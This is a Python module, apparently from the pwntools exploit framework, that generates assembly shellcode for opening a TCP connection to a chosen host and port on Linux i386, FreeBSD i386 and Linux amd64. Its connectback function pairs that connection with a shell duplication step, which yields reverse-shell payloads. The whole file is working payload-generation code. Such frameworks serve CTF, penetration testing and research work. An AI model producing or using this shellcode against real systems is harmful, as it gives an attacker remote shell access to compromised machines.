from pwn.internal.shellcode_helper import *
from .. import dupsh, pushstr

@shellcode_reqs(arch=['i386', 'amd64'], os=['linux', 'freebsd'], network='ipv4')
def connectback(host, port):
    """Args: host, port
    Standard connect back type shellcode."""
    return connect(host, port), dupsh()

@shellcode_reqs(arch=['i386', 'amd64'], os=['linux', 'freebsd'], network='ipv4')
def connect(host, port, arch = None, os = None):
    """Args: host, port
    Connects to host on port.  Leaves socket in EBP."""

    port = int(port)

    if arch == 'i386':
        if os == 'linux':
            return _connect_linux_i386(host, port)
        elif os == 'freebsd':
            return _connect_freebsd_i386(host, port)
    elif arch == 'amd64':
        if os == 'linux':
            return _connect_linux_amd64(host, port)
    else:
        no_support('connect', os, arch)

def _connect_linux_i386(host, port):
    return """
            ;; Connect to %(hostname)s on %(portnum)d
            ;; Socket file descriptor is placed in EBP

            ;; sock = socket(AF_INET, SOCK_STREAM, 0)
            push SYS_socketcall
            pop eax
            push SYS_socketcall_socket
            pop ebx
            cdq                     ; clear EDX
            push edx                ; IPPROTO_IP (= 0)
            push ebx                ; SOCK_STREAM
            push AF_INET
            mov ecx, esp
            int 0x80

            mov ebp, eax

            ;; connect(sock, &addr, sizeof addr); // sizeof addr == 0x10
            push %(host)d
            push word %(port)d
            push word AF_INET
            mov ecx, esp
            push 0x10               ; sizeof addr (= 0x10)
            push ecx                ; &addr
            push eax                ; sock
            mov ecx, esp            ; args
            inc ebx
            inc ebx                 ; EBX = connect (= 3)
            mov al, SYS_socketcall
            int 0x80
""" % {'hostname': host,
       'portnum' : port,
       'host'    : ip(host),
       'port'    : htons(port)
       }


def _connect_freebsd_i386(host, port):
    return """
            ;; Connect to %(hostname)s on %(portnum)d
            ;; Socket file descriptor is placed in EBP

            ;; sock = socket(AF_INET, SOCK_STREAM, 0)
            push SYS_socket
            pop eax
            cdq
            push edx
            push SOCK_STREAM
            push AF_INET
            push edx
            int 0x80

            mov ebp, eax

            ;; connect(sock, &addr, sizeof addr); // sizeof addr == 0x10
            push %(host)d
            push 0x10 | (AF_INET << 8) | (%(port)d << 16) ;; sa_len and sa_family does't really matter, but why not set them right?
            mov ebx, esp
            push 0x10
            push ebx
            push eax
            push eax
            mov al, SYS_connect
            int 0x80
""" % {'hostname': host,
       'portnum' : int(port),
       'host'    : ip(host),
       'port'    : htons(int(port))
       }

def _connect_linux_amd64(host, port):
    sock = pwn.asm('dw AF_INET, %d' % htons(port)) + p32(ip(host))

    return '''
push SYS64_socket
pop rax
push AF_INET
pop rdi
push SOCK_STREAM
pop rsi
cdq  ;; rdx = IPPROTO_IP (=0)
syscall
mov ebp, eax
''' + pushstr(sock, raw = True) + '''
mov edi, ebp
mov rsi, rsp
push 16
pop rdx
push SYS64_connect
pop rax
syscall
'''
